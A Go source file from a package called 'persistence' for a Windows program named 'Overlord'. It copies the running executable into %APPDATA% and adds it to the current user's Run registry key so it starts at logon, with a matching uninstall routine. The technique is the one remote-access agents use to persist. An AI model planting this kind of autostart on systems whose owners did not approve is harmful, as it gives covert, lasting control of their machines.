//go:build windows
// +build windows

package persistence

import (
	"fmt"
	"io"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

const registryKey = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
const registryValueName = "OverlordAgent"

func install(exePath string) error {

	appDataDir := os.Getenv("APPDATA")
	if appDataDir == "" {
		return fmt.Errorf("APPDATA environment variable not set")
	}

	overlordDir := filepath.Join(appDataDir, "Overlord")
	err := os.MkdirAll(overlordDir, 0755)
	if err != nil {
		return fmt.Errorf("failed to create Overlord directory: %w", err)
	}

	targetPath := filepath.Join(overlordDir, "agent.exe")

	if exePath != targetPath {

		srcFile, err := os.Open(exePath)
		if err != nil {
			return fmt.Errorf("failed to open source executable: %w", err)
		}
		defer srcFile.Close()

		dstFile, err := os.Create(targetPath)
		if err != nil {
			return fmt.Errorf("failed to create destination executable: %w", err)
		}
		defer dstFile.Close()

		_, err = io.Copy(dstFile, srcFile)
		if err != nil {
			return fmt.Errorf("failed to copy executable: %w", err)
		}

		err = dstFile.Sync()
		if err != nil {
			return fmt.Errorf("failed to sync destination file: %w", err)
		}
	}

	k, err := registry.OpenKey(registry.CURRENT_USER, registryKey, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %w", err)
	}
	defer k.Close()

	err = k.SetStringValue(registryValueName, targetPath)
	if err != nil {
		return fmt.Errorf("failed to set registry value: %w", err)
	}

	return nil
}

func uninstall() error {

	k, err := registry.OpenKey(registry.CURRENT_USER, registryKey, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %w", err)
	}
	defer k.Close()

	err = k.DeleteValue(registryValueName)
	if err != nil && err != registry.ErrNotExist {
		return fmt.Errorf("failed to delete registry value: %w", err)
	}

	appDataDir := os.Getenv("APPDATA")
	if appDataDir != "" {
		targetPath := filepath.Join(appDataDir, "Overlord", "agent.exe")

		os.Remove(targetPath)
	}

	return nil
}
